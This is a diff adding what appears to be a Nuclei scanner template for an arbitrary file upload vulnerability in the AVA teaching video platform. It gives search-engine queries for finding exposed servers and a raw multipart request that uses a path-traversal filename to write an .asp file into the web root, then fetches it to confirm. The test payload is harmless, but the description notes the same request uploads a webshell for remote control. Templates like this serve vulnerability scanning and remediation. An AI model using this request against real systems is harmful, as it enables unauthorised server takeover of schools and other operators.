@@ -1,0 +1,48 @@
+id: ava_video_upload
+info:
+  name: 奥威亚 教学视频应用服务平台任意文件上传漏洞
+  author: Xc1Ym
+  severity: critical
+  description: AVA 教学视频应用服务平台是由广州市奥威亚电子科技有限公司基于当前教育视频资源建设的背景及用户需求的调研，开发出来能够适应时代发展和满足学校需求，具有实效性、多功能、特点鲜明的平台。该平台存在任意文件上传漏洞，通过此漏洞攻击者可上传webshell木马，远程控制服务器。
+  metadata:
+    max-request: 1
+    fofa-query: body="/CSS/NewtonTheme/assets/app.css",body="/Upload/DomainInfo/MaxAVALogo.png"
+    hunter-query: web.body="Copyright © 2005-2018 广州市奥威亚电子科技有限公司"
+    verified: true
+  tags: upload,school,hw,intrusive
+variables:
+  payload: '{{rand_base(6)}}'
+  filename: '{{rand_base(6)}}'
+http:
+  - raw:
+      - |
+        POST /Tools/Video/VideoCover.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
+        Connection: close
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insectre-Requests: 1
+        Accept-Language: zh-CN,zh;g=0.9
+        Content-Length: 242
+        Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10
+
+        --68c4ca658cd4332dc386f53710e63a10
+        Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/{{filename}}.asp"
+        Content-Type: image/jpeg
+
+        {{payload}}
+        --68c4ca658cd4332dc386f53710e63a10--
+      - |
+        GET /{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+    req-condition: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_2==200
+          - contains(body_2, '{{payload}}')
+# digest: 4a0a0047304502200cede47de7c6d2e765d33b27e08ae1e6cca84a06b9c7b7cd8a7145df668eaa10022100847c0ba3040a6d989998488ae57e0f66d7f451e8420d652a8b1de8b09e65bab8:6b2dd5af372f02ed15a56faf8ad98cf9
